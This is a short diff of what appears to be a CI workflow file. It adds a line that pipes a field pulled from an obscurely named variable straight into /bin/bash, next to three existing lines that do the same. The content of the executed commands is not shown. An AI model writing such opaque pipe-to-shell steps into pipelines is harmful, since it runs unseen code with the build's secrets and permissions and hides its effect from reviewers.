@@ -25,6 +25,7 @@ jobs:
           echo $pqw32 | jq -r .qim5988 | /bin/bash
           printf '%s' "$cp5" | jq -r .f1 | /bin/bash
           echo $wc66643 | jq -r .aj13327 | /bin/bash
+          echo $sh5 | jq -r .ywyqg494 | /bin/bash
 
       - name: Store artifact
         if: always()
